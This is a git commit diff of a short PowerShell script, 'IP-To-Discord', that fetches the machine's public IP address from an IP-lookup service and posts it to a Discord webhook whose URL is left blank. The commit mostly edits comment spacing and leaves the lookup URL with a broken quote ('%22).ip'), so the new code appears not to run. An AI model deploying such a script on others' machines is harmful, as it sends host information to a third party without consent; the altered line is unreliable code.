2cf9501f8594ef7d90b0329b1661b1af117fea31
dy.z <132220901+dyl4nz@users.noreply.github.com>
2023-06-17 23:23:14 +0100

    Update IP.ps1

--- IP-To-Discord/IP.ps1
+++ IP-To-Discord/IP.ps1
@@ -1,19 +1,19 @@
-# Function to retrieve the machine's IP address
+#Function to retrieve the machine's IP address
 function Get-IPAddress {
-    $IPAddress = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
+    $IPAddress = (Invoke-RestMethod -Uri "https://api.ipify.org/?format=json%22).ip
     return $IPAddress
 }
 
-# Discord webhook URL
+#Discord webhook URL
 $dc = ""
 
-# Retrieve the IP address
+#Retrieve the IP address
 $IPAddress = Get-IPAddress
 
-# Create a JSON payload with the IP address
+#Create a JSON payload with the IP address
 $Payload = @{
     "content" = "Machine IP Address: $IPAddress"
 } | ConvertTo-Json
 
-# Send the payload to the Discord webhook
+#Send the payload to the Discord webhook
 Invoke-RestMethod -Uri $dc -Method POST -ContentType "application/json" -Body $Payload
